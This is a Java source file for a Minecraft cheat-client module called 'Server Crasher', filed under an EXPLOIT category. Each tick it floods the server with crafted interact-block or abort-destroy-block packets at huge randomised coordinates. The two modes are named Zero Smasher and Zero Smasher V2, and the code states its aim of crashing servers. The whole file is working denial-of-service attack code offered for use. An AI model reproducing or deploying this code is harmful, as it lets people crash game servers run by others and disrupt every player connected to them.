package me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import me.nekosarekawaii.foxglove.event.impl.TickListener;
import me.nekosarekawaii.foxglove.feature.FeatureCategory;
import me.nekosarekawaii.foxglove.feature.impl.module.Module;
import me.nekosarekawaii.foxglove.feature.impl.module.ModuleInfo;
import me.nekosarekawaii.foxglove.util.EnumNameNormalizer;
import me.nekosarekawaii.foxglove.value.Value;
import me.nekosarekawaii.foxglove.value.values.ListValue;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.concurrent.ThreadLocalRandom;

@ModuleInfo(name = "Server Crasher", description = "Can crash servers.", category = FeatureCategory.EXPLOIT, isExperimental = true)
public class ServerCrasherModule extends Module implements TickListener {

    private final Value<String> mode = new ListValue("Mode", "The current crash mode.", this, Mode.ZERO_SMASHER.normalName(), Mode.ZERO_SMASHER_V2.normalName());

    @Override
    protected void onEnable() {
        DietrichEvents2.global().subscribe(TickEvent.ID, this);
    }

    @Override
    protected void onDisable() {
        DietrichEvents2.global().unsubscribe(TickEvent.ID, this);
    }

    @Override
    public void onTick() {
        final ClientWorld world = mc.world;
        final ClientPlayerEntity player = mc.player;
        final ClientPlayNetworkHandler networkHandler = mc.getNetworkHandler();
        final ClientPlayerInteractionManager interactionManager = mc.interactionManager;
        if (world == null || player == null || networkHandler == null || interactionManager == null) return;
        final BlockPos playerPos = player.getBlockPos();
        if (this.mode.getValue().equals(Mode.ZERO_SMASHER.normalName())) {
            final int
                    x = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000),
                    y = playerPos.getY(),
                    z = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000);
            interactionManager.sendSequencedPacket(world, sequence -> new PlayerInteractBlockC2SPacket(
                    Hand.MAIN_HAND,
                    new BlockHitResult(
                            new Vec3d(x, y, z),
                            Direction.DOWN,
                            new BlockPos(x, y, z),
                            false
                    ),
                    sequence
            ));
        } else if (this.mode.getValue().equals(Mode.ZERO_SMASHER_V2.normalName())) {
            final int
                    x = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000),
                    y = playerPos.getY(),
                    z = playerPos.getX() * ThreadLocalRandom.current().nextInt(1000, 10000);
            interactionManager.sendSequencedPacket(world, sequence -> new PlayerActionC2SPacket(
                    PlayerActionC2SPacket.Action.ABORT_DESTROY_BLOCK,
                    new BlockPos(x, y, z),
                    Direction.DOWN,
                    sequence
            ));
        }
    }

    private enum Mode implements EnumNameNormalizer {

        ZERO_SMASHER, ZERO_SMASHER_V2;

        private final String normalName;

        Mode() {
            this.normalName = this.normalizeName(this.name());
        }

        @Override
        public String normalName() {
            return this.normalName;
        }

    }

}
